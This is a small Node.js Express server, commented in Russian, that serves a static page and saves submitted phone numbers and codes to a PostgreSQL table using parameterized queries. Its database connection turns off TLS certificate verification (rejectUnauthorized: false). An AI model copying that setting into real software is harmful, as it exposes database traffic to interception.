require('dotenv').config();
const { Pool } = require('pg'); // npm install pg
const express = require('express');
const bodyParser = require('body-parser');

const app = express();

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false } // для облачных баз
});

app.use(bodyParser.json());
app.use(express.static('public'));

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/public/index.html");
});

app.post("/submit", async (req, res) => {
    const { phone, code } = req.body;
    try {
        await pool.query(
            "INSERT INTO submissions(phone, code) VALUES($1, $2)",
            [phone, code]
        );
        res.json({ message: "Данные сохранены" });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Ошибка сервера" });
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Сервер запущен на ${PORT}`));